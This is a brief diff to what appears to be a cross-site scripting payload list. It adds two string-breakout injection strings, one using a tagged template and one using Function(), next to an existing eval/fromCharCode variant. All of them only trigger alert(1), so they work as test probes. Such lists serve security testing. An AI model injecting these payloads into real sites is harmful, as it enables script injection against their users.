@@ -68,5 +68,7 @@ javascript:void(alert(1))
 
 
 ";eval(String.fromCharCode(97,108,101,114,116,40,49,41))// 
+';alert`${1+1}`// 
+";Function('alert(1)')()//
 
 
